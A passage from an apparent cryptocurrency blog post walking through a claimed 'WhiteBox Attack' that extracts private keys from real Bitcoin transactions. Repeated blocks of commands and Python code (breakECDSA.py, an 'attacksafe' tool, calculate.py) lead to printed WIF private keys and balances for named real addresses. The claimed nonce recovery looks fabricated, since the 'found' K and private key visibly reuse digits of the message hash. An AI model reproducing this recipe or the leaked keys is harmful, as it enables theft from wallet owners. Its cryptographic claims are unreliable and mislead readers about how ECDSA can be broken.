<p><a href="https://btc1.trezor.io/tx/f4a5275858cadcb6c2d2d605fcfe6b192560a2a18d9317c22bc37b77b6533ed6">https://btc1.trezor.io/tx/f4a5275858cadcb6c2d2d605fcfe6b192560a2a18d9317c22bc37b77b6533ed6</a></p>
</blockquote>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-43-1024x140.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1641"></figure>



<pre class="wp-block-code"><code>RawTX = 0100000001794e79fc042a7644cc4deb6e7858416dd8b898fe418b2894f8d3772ce8d132a0180000006a473044022048771a103dbc561b895d573a9b706b98f643701466de15980fa712b544554ba502202756e42292c841ccfef832138c52f66f7e03b7f2f86cf3fb4d7fd43d6a526be701210262c3a8791c0e44cd389ebe51c156b5aac490cddef3536638abf8863d55190adbffffffff010c03000000000000232103d68f90ba81455256cb7a0df14fb3930d6df61393207f2f3e71659414d296e0f0ac00000000
</code></pre>



<h2>Now we need to get all R, S, Z values ​​from all vulnerable transactions</h2>



<p>Let’s use the breakECDSA.py script</p>



<pre class="wp-block-code"><code>python2 breakECDSA.py 0100000001794e79fc042a7644cc4deb6e7858416dd8b898fe418b2894f8d3772ce8d132a0180000006a473044022048771a103dbc561b895d573a9b706b98f643701466de15980fa712b544554ba502202756e42292c841ccfef832138c52f66f7e03b7f2f86cf3fb4d7fd43d6a526be701210262c3a8791c0e44cd389ebe51c156b5aac490cddef3536638abf8863d55190adbffffffff010c03000000000000232103d68f90ba81455256cb7a0df14fb3930d6df61393207f2f3e71659414d296e0f0ac00000000
</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-44-1024x216.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1643"></figure>



<pre class="wp-block-code"><code>R = 0x48771a103dbc561b895d573a9b706b98f643701466de15980fa712b544554ba5
S = 0x2756e42292c841ccfef832138c52f66f7e03b7f2f86cf3fb4d7fd43d6a526be7
Z = 0xa402dc224f712e09602b06c595f272f3e09408f052d8fba3d88609bbbb150139</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>To get the secret key from a vulnerable ECDSA signing transaction, let’s add the data&nbsp;<code>RawTX</code>to a text document and save it as a file<code>RawTX.txt</code></p>



<pre class="wp-block-code"><code>0100000001794e79fc042a7644cc4deb6e7858416dd8b898fe418b2894f8d3772ce8d132a0180000006a473044022048771a103dbc561b895d573a9b706b98f643701466de15980fa712b544554ba502202756e42292c841ccfef832138c52f66f7e03b7f2f86cf3fb4d7fd43d6a526be701210262c3a8791c0e44cd389ebe51c156b5aac490cddef3536638abf8863d55190adbffffffff010c03000000000000232103d68f90ba81455256cb7a0df14fb3930d6df61393207f2f3e71659414d296e0f0ac00000000</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Launch&nbsp;<code>-tool whitebox_attack</code>using software<code>“ATTACKSAFE SOFTWARE”</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>./attacksafe -tool whitebox_attack -open RawTX.txt -save SecretKey.txt</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-47-1024x262.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1649"></figure>



<p>We launched this attack from&nbsp;<code>-tool whitebox_attack</code>and the result was saved to a file<code>SecretKey.txt</code></p>



<p>Now to see the successful result, open the file<code>SecretKey.txt</code></p>



<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-46-1024x374.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1647"></figure>



<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0xa402dc224f712e09602b06c595f272f3028a6a6f6ef174708aac8121c40e8545

RawTX = 0100000001794e79fc042a7644cc4deb6e7858416dd8b898fe418b2894f8d3772ce8d132a0180000006a473044022048771a103dbc561b895d573a9b706b98f643701466de15980fa712b544554ba502202756e42292c841ccfef832138c52f66f7e03b7f2f86cf3fb4d7fd43d6a526be701210262c3a8791c0e44cd389ebe51c156b5aac490cddef3536638abf8863d55190adbffffffff010c03000000000000232103d68f90ba81455256cb7a0df14fb3930d6df61393207f2f3e71659414d296e0f0ac00000000</code></pre>



<p>We see an inscription&nbsp;<code>"Deployments ECDSA"</code>that means a critical vulnerability in the Bitcoin blockchain transaction.</p>



<p><code>SecretKey value in HEX format, this is our secret key "K" (NONCE):</code></p>



<p><code>K = 0x39ec5220d3937da589231cbaa5b04002ce3b5689173680ee110ef81287f7867e</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s check with a&nbsp;<em>Python</em>&nbsp;script<code>point2gen.py</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>Let’s use the ECPy</strong></a>&nbsp;elliptic curve library&nbsp;:</p>



<p>Now let’s run the script by specifying&nbsp;<code>Secret Key "K" (NONCE)</code>:</p>



<pre class="wp-block-code"><code>python3 point2gen.py 0xa402dc224f712e09602b06c595f272f3028a6a6f6ef174708aac8121c40e8545</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-48-1024x86.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1651"></figure>



<p><code>(0x48771a103dbc561b895d573a9b706b98f643701466de15980fa712b544554ba5 , 0x2c4374cfc4d21df60a3e7592c8ec0ca98640af2adc89276f75d80e65381a36ec)</code></p>



<p>Checking the coordinates of a point&nbsp;<code>EC (secp256k1)&nbsp;</code>with a signature value<code>R</code></p>



<pre class="wp-block-code"><code>R = 0x48771a103dbc561b895d573a9b706b98f643701466de15980fa712b544554ba5
S = 0x2756e42292c841ccfef832138c52f66f7e03b7f2f86cf3fb4d7fd43d6a526be7
Z = 0xa402dc224f712e09602b06c595f272f3e09408f052d8fba3d88609bbbb150139</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>R          =    0x48771a103dbc561b895d573a9b706b98f643701466de15980fa712b544554ba5
point2gen  =   (0x48771a103dbc561b895d573a9b706b98f643701466de15980fa712b544554ba5 , 0x2c4374cfc4d21df60a3e7592c8ec0ca98640af2adc89276f75d80e65381a36ec)
</code></pre>



<p><code>ALL CORRECT!</code></p>



<p><code>K = 0xa402dc224f712e09602b06c595f272f3028a6a6f6ef174708aac8121c40e8545</code></p>



<p>Now knowing the secret key, we can get the private key to the Bitcoin Wallet:<code>12bXHGbbWeqyixHpNjeSmq271ennbLRXh9</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s use&nbsp; the&nbsp;<em>Python</em>&nbsp;script:&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; Get the Private Key</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s open the code and add all the value of the signatures<code><strong>K, R, S, Z</strong></code></p>



<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0xa402dc224f712e09602b06c595f272f3028a6a6f6ef174708aac8121c40e8545
R = 0x48771a103dbc561b895d573a9b706b98f643701466de15980fa712b544554ba5
S = 0x2756e42292c841ccfef832138c52f66f7e03b7f2f86cf3fb4d7fd43d6a526be7
Z = 0xa402dc224f712e09602b06c595f272f3e09408f052d8fba3d88609bbbb150139


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>



<h2>The script will calculate the private key using the formula:</h2>



<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>



<p>Let’s run the script:</p>



<pre class="wp-block-code"><code>python3 calculate.py</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-49.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1653"></figure>



<p><code>PrivKey = 028a6a6f6ef174708aac8121c40e8545def4e73d5dd98f8a343f083a49fca03d</code></p>



<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">Let’s open bitaddress</a></strong>&nbsp;and&nbsp;check:</p>



<pre class="wp-block-code"><code>ADDR: 12bXHGbbWeqyixHpNjeSmq271ennbLRXh9
WIF:  KwJedezSt21uB3ZoHvzkWbcad4VLaJXu8467Jw58j47s4cseQJrk
HEX:  028a6a6f6ef174708aac8121c40e8545def4e73d5dd98f8a343f083a49fca03d</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/002-2.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1691"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://www.blockchain.com/btc/address/12bXHGbbWeqyixHpNjeSmq271ennbLRXh9">https://www.blockchain.com/btc/address/12bXHGbbWeqyixHpNjeSmq271ennbLRXh9</a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><code>Private Key Found!</code></p>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/002-addr.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1655"><figcaption class="wp-element-caption"><strong><a href="https://www.blockchain.com/btc/address/12bXHGbbWeqyixHpNjeSmq271ennbLRXh9" target="_blank" rel="noreferrer noopener"><code>www.blockchain.com/btc/address/12bXHGbbWeqyixHpNjeSmq271ennbLRXh9</code></a></strong></figcaption></figure>



<p><code>BALANCE: $ 635.44</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong><code>№3</code></strong></p>



<p>With detailed cryptanalysis, we also found a critical vulnerability in Bitcoin Address:</p>



<blockquote class="wp-block-quote">
<p><strong><a href="https://btc1.trezor.io/address/15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz" target="_blank" rel="noreferrer noopener">15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz</a></strong></p>



<p><a href="https://btc1.trezor.io/tx/c8bbc3b05bc3a560ed5f4655c73cccf5cf6ff09b62279691df06ad8a121c9859">https://btc1.trezor.io/tx/c8bbc3b05bc3a560ed5f4655c73cccf5cf6ff09b62279691df06ad8a121c9859</a></p>



<p><a href="https://btc1.trezor.io/tx/1bd43bdeb2d76f0c24eef5abddfdc439f02406375ccc02d44299715b057bdf7e">https://btc1.trezor.io/tx/1bd43bdeb2d76f0c24eef5abddfdc439f02406375ccc02d44299715b057bdf7e</a></p>
</blockquote>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-4-1024x201.png" alt="WhiteBox Attack" class="wp-image-1531"></figure></div>

<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-5-1024x200.png" alt="WhiteBox Attack" class="wp-image-1533"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Prepare RawTX for the attack</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote">
<p><strong><a href="https://btc1.trezor.io/address/15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz" target="_blank" rel="noreferrer noopener">15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz</a></strong></p>



<p><a href="https://btc1.trezor.io/tx/c8bbc3b05bc3a560ed5f4655c73cccf5cf6ff09b62279691df06ad8a121c9859">https://btc1.trezor.io/tx/c8bbc3b05bc3a560ed5f4655c73cccf5cf6ff09b62279691df06ad8a121c9859</a></p>
</blockquote>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-50-1024x142.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1656"></figure>



<pre class="wp-block-code"><code>RawTX = 01000000015c55f614688adf76c9186a89af07d4aca2aba8d612d6b445e8bd500bef21dac62b0000006a47304402207f252f8be450d3a7573c9a69ae96392e23dd58d7dc0ca3b835b9760f4056772d0220712f483ef5f8b98166fa673c6a8eb8379249cb1a3a7842d1d877096fca773677012102506c7593c4e301c2729dbfc46b2959c7a92f6f20c672b6d0feff9c5b6a567cf9ffffffff01c6020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000
</code></pre>



<h2>Now we need to get all R, S, Z values ​​from all vulnerable transactions</h2>



<p>Let’s use the breakECDSA.py script</p>



<pre class="wp-block-code"><code>python2 breakECDSA.py 01000000015c55f614688adf76c9186a89af07d4aca2aba8d612d6b445e8bd500bef21dac62b0000006a47304402207f252f8be450d3a7573c9a69ae96392e23dd58d7dc0ca3b835b9760f4056772d0220712f483ef5f8b98166fa673c6a8eb8379249cb1a3a7842d1d877096fca773677012102506c7593c4e301c2729dbfc46b2959c7a92f6f20c672b6d0feff9c5b6a567cf9ffffffff01c6020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000
</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-51-1024x213.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1658"></figure>



<pre class="wp-block-code"><code>R = 0x7f252f8be450d3a7573c9a69ae96392e23dd58d7dc0ca3b835b9760f4056772d
S = 0x712f483ef5f8b98166fa673c6a8eb8379249cb1a3a7842d1d877096fca773677
Z = 0x2a3395f1143929b17c0dd24f89fc6eceee3d099c2286b7d1f147886ca30e5a7d</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>To get the secret key from a vulnerable ECDSA signing transaction, let’s add the data&nbsp;<code>RawTX</code>to a text document and save it as a file<code>RawTX.txt</code></p>



<pre class="wp-block-code"><code>01000000015c55f614688adf76c9186a89af07d4aca2aba8d612d6b445e8bd500bef21dac62b0000006a47304402207f252f8be450d3a7573c9a69ae96392e23dd58d7dc0ca3b835b9760f4056772d0220712f483ef5f8b98166fa673c6a8eb8379249cb1a3a7842d1d877096fca773677012102506c7593c4e301c2729dbfc46b2959c7a92f6f20c672b6d0feff9c5b6a567cf9ffffffff01c6020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Launch&nbsp;<code>-tool whitebox_attack</code>using software<code>“ATTACKSAFE SOFTWARE”</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>./attacksafe -tool whitebox_attack -open RawTX.txt -save SecretKey.txt</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-52-1024x268.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1660"></figure>



<p>We launched this attack from&nbsp;<code>-tool whitebox_attack</code>and the result was saved to a file<code>SecretKey.txt</code></p>



<p>Now to see the successful result, open the file<code>SecretKey.txt</code></p>



<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-53-1024x376.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1662"></figure>



<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0xdd3fee317f873f30a38a54c2566a07cb7682612e3564996017b993b5416fcddc

RawTX = 01000000015c55f614688adf76c9186a89af07d4aca2aba8d612d6b445e8bd500bef21dac62b0000006a47304402207f252f8be450d3a7573c9a69ae96392e23dd58d7dc0ca3b835b9760f4056772d0220712f483ef5f8b98166fa673c6a8eb8379249cb1a3a7842d1d877096fca773677012102506c7593c4e301c2729dbfc46b2959c7a92f6f20c672b6d0feff9c5b6a567cf9ffffffff01c6020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>



<p>We see an inscription&nbsp;<code>"Deployments ECDSA"</code>that means a critical vulnerability in the Bitcoin blockchain transaction.</p>



<p><code>SecretKey value in HEX format, this is our secret key "K" (NONCE):</code></p>



<p><code>K = 0xdd3fee317f873f30a38a54c2566a07cb7682612e3564996017b993b5416fcddc</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s check with a&nbsp;<em>Python</em>&nbsp;script<code>point2gen.py</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>Let’s use the ECPy</strong></a>&nbsp;elliptic curve library&nbsp;:</p>



<p>Now let’s run the script by specifying&nbsp;<code>Secret Key "K" (NONCE)</code>:</p>



<pre class="wp-block-code"><code>python3 point2gen.py 0xdd3fee317f873f30a38a54c2566a07cb7682612e3564996017b993b5416fcddc</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-54-1024x87.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1663"></figure>



<p><code>(0x7f252f8be450d3a7573c9a69ae96392e23dd58d7dc0ca3b835b9760f4056772d , 0xe4eedac586ca23bf57a44e5de537e097ea28205a4eeef93c51fe2ee2b783280e)</code></p>



<p>Checking the coordinates of a point&nbsp;<code>EC (secp256k1)&nbsp;</code>with a signature value<code>R</code></p>



<pre class="wp-block-code"><code>R = 0x7f252f8be450d3a7573c9a69ae96392e23dd58d7dc0ca3b835b9760f4056772d
S = 0x712f483ef5f8b98166fa673c6a8eb8379249cb1a3a7842d1d877096fca773677
Z = 0x2a3395f1143929b17c0dd24f89fc6eceee3d099c2286b7d1f147886ca30e5a7d</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>R          =    0x7f252f8be450d3a7573c9a69ae96392e23dd58d7dc0ca3b835b9760f4056772d
point2gen  =   (0x7f252f8be450d3a7573c9a69ae96392e23dd58d7dc0ca3b835b9760f4056772d , 0xe4eedac586ca23bf57a44e5de537e097ea28205a4eeef93c51fe2ee2b783280e)
</code></pre>



<p><code>ALL CORRECT!</code></p>



<p><code>K = 0xdd3fee317f873f30a38a54c2566a07cb7682612e3564996017b993b5416fcddc</code></p>



<p>Now knowing the secret key, we can get the private key to the Bitcoin Wallet:<code>15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s use&nbsp; the&nbsp;<em>Python</em>&nbsp;script:&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; Get the Private Key</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s open the code and add all the value of the signatures<code><strong>K, R, S, Z</strong></code></p>



<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0xdd3fee317f873f30a38a54c2566a07cb7682612e3564996017b993b5416fcddc
R = 0x7f252f8be450d3a7573c9a69ae96392e23dd58d7dc0ca3b835b9760f4056772d
S = 0x712f483ef5f8b98166fa673c6a8eb8379249cb1a3a7842d1d877096fca773677
Z = 0x2a3395f1143929b17c0dd24f89fc6eceee3d099c2286b7d1f147886ca30e5a7d


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>



<h2>The script will calculate the private key using the formula:</h2>



<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>



<p>Let’s run the script:</p>



<pre class="wp-block-code"><code>python3 calculate.py</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-55.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1664"></figure>



<p><code>PrivKey = 16f2eaf0c267f036f926d0b1332c05f244427c65ce70a11b96842bf1a8221301</code></p>



<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">Let’s open bitaddress</a></strong>&nbsp;and&nbsp;check:</p>



<pre class="wp-block-code"><code>ADDR: 15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz
WIF:  KwzKYYfPTrdAZA5m1kxs4WAjSWTuJRnD2ANKHGUugibgFBP4oDSG
HEX:  16f2eaf0c267f036f926d0b1332c05f244427c65ce70a11b96842bf1a8221301</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/003-1.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1693"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://www.blockchain.com/btc/address/15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz">https://www.blockchain.com/btc/address/15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz</a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><code>Private Key Found!</code></p>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-57-1024x476.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1667"><figcaption class="wp-element-caption"><strong><a href="https://www.blockchain.com/btc/address/15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz" target="_blank" rel="noreferrer noopener"><code>www.blockchain.com/btc/address/15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz</code></a></strong></figcaption></figure>



<p><code>BALANCE: $ 657.68</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote">
<p><em>The potential threat of losing BTC coins lies in the critical vulnerability of the Bitcoin blockchain transaction, so we strongly recommend that everyone always update the software and use only verified devices.</em></p>
</blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>With detailed cryptanalysis, we also found a critical vulnerability in&nbsp;<strong><a href="https://btc1.trezor.io/tx/1bd43bdeb2d76f0c24eef5abddfdc439f02406375ccc02d44299715b057bdf7e" target="_blank" rel="noreferrer noopener">1bd43bdeb2d76f0c24eef5abddfdc439f02406375ccc02d44299715b057bdf7e</a></strong>&nbsp;for the same Bitcoin Address<strong><code>&nbsp;TXID:</code></strong><strong><a href="https://btc1.trezor.io/tx/1bd43bdeb2d76f0c24eef5abddfdc439f02406375ccc02d44299715b057bdf7e" target="_blank" rel="noreferrer noopener"></a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Prepare RawTX for the attack</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote">
<p><strong><a href="https://btc1.trezor.io/address/15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz" target="_blank" rel="noreferrer noopener">15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz</a></strong></p>



<p><a href="https://btc1.trezor.io/tx/1bd43bdeb2d76f0c24eef5abddfdc439f02406375ccc02d44299715b057bdf7e">https://btc1.trezor.io/tx/1bd43bdeb2d76f0c24eef5abddfdc439f02406375ccc02d44299715b057bdf7e</a></p>
</blockquote>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-58-1024x138.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1670"></figure>



<pre class="wp-block-code"><code>RawTX = 0100000001090090e02de381ea337027a92b40cf9ea64c49f3ff4a5dc6e86514cbb3e6fbba210000006b483045022100abfd0edfab28bfdaffd134487cbba8baba8796ae5da45cf5bdd8b73f221edfc902201b52781a8e038c877146d0671638be48da3a0e946589ebdc3bb876d351292ddc012102506c7593c4e301c2729dbfc46b2959c7a92f6f20c672b6d0feff9c5b6a567cf9ffffffff0180020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000
</code></pre>



<h2>Now we need to get all R, S, Z values ​​from all vulnerable transactions</h2>



<p>Let’s use the breakECDSA.py script</p>



<pre class="wp-block-code"><code>python2 breakECDSA.py 0100000001090090e02de381ea337027a92b40cf9ea64c49f3ff4a5dc6e86514cbb3e6fbba210000006b483045022100abfd0edfab28bfdaffd134487cbba8baba8796ae5da45cf5bdd8b73f221edfc902201b52781a8e038c877146d0671638be48da3a0e946589ebdc3bb876d351292ddc012102506c7593c4e301c2729dbfc46b2959c7a92f6f20c672b6d0feff9c5b6a567cf9ffffffff0180020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000
</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-59-1024x213.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1671"></figure>



<pre class="wp-block-code"><code>R = 0xabfd0edfab28bfdaffd134487cbba8baba8796ae5da45cf5bdd8b73f221edfc9
S = 0x1b52781a8e038c877146d0671638be48da3a0e946589ebdc3bb876d351292ddc
Z = 0x4ff2faf760c97ea590a3c7deec2698695e9559d629d1e73271623fd07cfbeffa</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>To get the secret key from a vulnerable ECDSA signing transaction, let’s add the data&nbsp;<code>RawTX</code>to a text document and save it as a file<code>RawTX.txt</code></p>



<pre class="wp-block-code"><code>0100000001090090e02de381ea337027a92b40cf9ea64c49f3ff4a5dc6e86514cbb3e6fbba210000006b483045022100abfd0edfab28bfdaffd134487cbba8baba8796ae5da45cf5bdd8b73f221edfc902201b52781a8e038c877146d0671638be48da3a0e946589ebdc3bb876d351292ddc012102506c7593c4e301c2729dbfc46b2959c7a92f6f20c672b6d0feff9c5b6a567cf9ffffffff0180020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Launch&nbsp;<code>-tool whitebox_attack</code>using software<code>“ATTACKSAFE SOFTWARE”</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">

